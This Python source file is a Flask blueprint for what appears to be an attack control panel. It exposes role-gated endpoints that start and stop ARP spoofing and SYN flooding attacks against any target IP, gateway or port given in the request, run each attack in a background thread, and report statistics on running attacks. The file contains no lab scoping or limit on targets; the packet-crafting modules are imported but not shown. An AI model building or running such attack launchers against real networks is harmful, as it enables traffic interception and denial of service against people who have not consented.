"""
Attack Routes - ARP Spoofing, SYN Flooding
Flask Blueprint for attack endpoints
"""

from flask import Blueprint, request, jsonify, session
from functools import wraps
import threading
import uuid
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.arp_spoof import ARPSpoofer
from modules.syn_flood import SYNFlooder
from models import active_attacks, log_attack

attacks_bp = Blueprint('attacks', __name__)


# ============================================================================
# MIDDLEWARE: Check User Role
# ============================================================================

def require_attacker(f):
    """Decorator to require attacker role"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if session.get('user_role') not in ['ATTACKER', 'ADMIN']:
            return jsonify({'error': 'Access denied'}), 403
        return f(*args, **kwargs)
    return decorated_function


# ============================================================================
# ARP SPOOFING ENDPOINTS
# ============================================================================

@attacks_bp.route('/arp/start', methods=['POST'])
@require_attacker
def start_arp_attack():
    """Start ARP spoofing attack"""
    try:
        data = request.get_json()
        victim_ip = data.get('target_ip')
        gateway_ip = data.get('gateway_ip')
        interface = data.get('interface') or 'eth0'
        interval = data.get('interval', 2)
        
        # Validate
        if not victim_ip or not gateway_ip:
            return jsonify({'error': 'Missing parameters: target_ip, gateway_ip'}), 400
        
        # Create unique attack ID
        attack_id = f"arp_{victim_ip}_{gateway_ip}"
        
        # Check if already running
        if attack_id in active_attacks:
            return jsonify({'error': 'Attack already running'}), 400
        
        # Create ARP spoofer
        spoofer = ARPSpoofer(victim_ip, gateway_ip, interface)
        
        # Start in background thread
        def run_attack():
            try:
                spoofer.start(interval=interval)
            except Exception as e:
                print(f"ARP Attack Error: {e}")
        
        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()
        
        # Store in memory
        active_attacks[attack_id] = {
            'object': spoofer,
            'type': 'arp',
            'target_ip': victim_ip,
            'gateway_ip': gateway_ip,
            'packets_sent': 0,
            'status': 'running'
        }
        
        # Log attack
        log_attack('ARP_SPOOFING', victim_ip, gateway_ip, 'running')
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'message': f'ARP spoofing attack started against {victim_ip}'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@attacks_bp.route('/arp/stop', methods=['POST'])
@require_attacker
def stop_arp_attack():
    """Stop ARP spoofing attack"""
    try:
        data = request.get_json()
        attack_id = data.get('attack_id')
        
        if attack_id not in active_attacks:
            return jsonify({'error': 'Attack not found'}), 404
        
        attack_info = active_attacks[attack_id]
        spoofer = attack_info['object']
        
        # Stop attack
        spoofer.stop()
        
        # Remove from active attacks
        del active_attacks[attack_id]
        
        # Log
        log_attack('ARP_SPOOFING', attack_info['target_ip'], attack_info['gateway_ip'], 'stopped')
        
        return jsonify({
            'status': 'stopped',
            'message': 'ARP attack stopped and ARP tables restored'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================================
# SYN FLOODING ENDPOINTS
# ============================================================================

@attacks_bp.route('/syn/start', methods=['POST'])
@require_attacker
def start_syn_attack():
    """Start SYN flooding attack"""
    try:
        data = request.get_json()
        target_ip = data.get('target_ip')
        target_port = data.get('target_port', 80)
        num_threads = data.get('threads', 10)
        
        # Validate
        if not target_ip:
            return jsonify({'error': 'Missing parameter: target_ip'}), 400
        
        # Create unique attack ID
        attack_id = f"syn_{target_ip}_{target_port}"
        
        # Check if already running
        if attack_id in active_attacks:
            return jsonify({'error': 'Attack already running'}), 400
        
        # Create SYN flooder
        flooder = SYNFlooder(target_ip, target_port, num_threads)
        
        # Start in background thread
        def run_attack():
            try:
                flooder.start()
            except Exception as e:
                print(f"SYN Flood Error: {e}")
        
        thread = threading.Thread(target=run_attack, daemon=True)
        thread.start()
        
        # Store in memory
        active_attacks[attack_id] = {
            'object': flooder,
            'type': 'syn',
            'target_ip': target_ip,
            'target_port': target_port,
            'packets_sent': 0,
            'status': 'running'
        }
        
        # Log attack
        log_attack('SYN_FLOODING', target_ip, None, 'running')
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'message': f'SYN flooding attack started against {target_ip}:{target_port}'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@attacks_bp.route('/syn/stop', methods=['POST'])
@require_attacker
def stop_syn_attack():
    """Stop SYN flooding attack"""
    try:
        data = request.get_json()
        attack_id = data.get('attack_id')
        
        if attack_id not in active_attacks:
            return jsonify({'error': 'Attack not found'}), 404
        
        attack_info = active_attacks[attack_id]
        flooder = attack_info['object']
        
        # Stop attack
        flooder.stop()
        
        # Remove from active attacks
        del active_attacks[attack_id]
        
        # Log
        log_attack('SYN_FLOODING', attack_info['target_ip'], None, 'stopped')
        
        return jsonify({
            'status': 'stopped',
            'message': 'SYN flooding attack stopped'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# ============================================================================
# ATTACK STATISTICS
# ============================================================================

@attacks_bp.route('/stats', methods=['GET'])
@require_attacker
def get_attack_stats():
    """Get statistics on running attacks"""
    try:
        attacks = {}
        
        for attack_id, attack_info in active_attacks.items():
            attacks[attack_id] = {
                'type': attack_info['type'],
                'target_ip': attack_info['target_ip'],
                'packets_sent': attack_info['packets_sent'],
                'status': attack_info['status']
            }
        
        return jsonify({'attacks': attacks}), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500
